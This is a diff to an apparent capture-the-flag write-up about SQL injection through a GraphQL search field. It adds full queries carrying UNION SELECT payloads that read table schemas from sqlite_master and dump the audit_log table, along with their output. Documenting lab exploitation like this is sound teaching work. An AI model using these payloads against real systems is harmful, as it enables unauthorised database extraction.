@@ -197,7 +197,7 @@ query {
 }
 ```
 
-The injected values `1,2,3,4,5` appeared in the response - UNION injection confirmed.
+The injected values `1,2,3,4,5` appeared in the response - UNION injection confirmed. This tells me which position in the UNION maps to which GraphQL field:
 
 **Column Mapping:**
 
@@ -237,12 +237,64 @@ query {
 
 ### Step 4 - Extracting the Schema
 
-Extracted the `audit_log` schema - found deployment events but no flag. Interesting, but not what I needed.
+Starting with `audit_log`:
+
+```graphql
+query {
+  users(search: "' UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE name='audit_log'-- -") {
+    id
+    username
+    displayName
+    role
+    bio
+  }
+}
+```
+
+```
+CREATE TABLE audit_log (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  event TEXT NOT NULL,
+  created_by TEXT NOT NULL
+)
+```
+
+Dumped its contents:
+
+```graphql
+query {
+  users(search: "' UNION SELECT 1,event,3,created_by,5 FROM audit_log-- -") {
+    id
+    username
+    displayName
+    role
+    bio
+  }
+}
+```
+
+```json
+{
+  "username": "directory service deployed", "role": "admin"
+  "username": "public GraphQL endpoint enabled", "role": "mira"
+  "username": "search resolver patched quickly before launch", "role": "rakan"
+}
+```
+
+Deployment events - interesting context but no flag. Moved on to `users`.
 
 Extracted the `users` table schema:
 
 ```graphql
-users(search: "' UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE name='users'-- -")
+query {
+  users(search: "' UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE name='users'-- -") {
+    id
+    username
+    displayName
+    role
+    bio
+  }
+}
 ```
 
 ```
@@ -306,7 +358,7 @@ In a real application, a GraphQL endpoint with an unsanitized search parameter c
 
 1. GraphQL queries need to be syntactically complete - always specify fields to return
 2. GraphQL Introspection is a powerful recon tool - always try it before assuming the schema is complete
-3. Not everything related to admin will be the vulnerability - the real issue was in the search parameter
+3. Don't fixate on the obvious target - the admin account looked interesting but the real vulnerability was in the search parameter
 4. Searching with an empty string can reveal data that filtered searches hide
 5. SQLi is possible through GraphQL - the transport layer does not protect against it
 6. Database fingerprinting matters - `information_schema` failing told me exactly what database I was dealing with
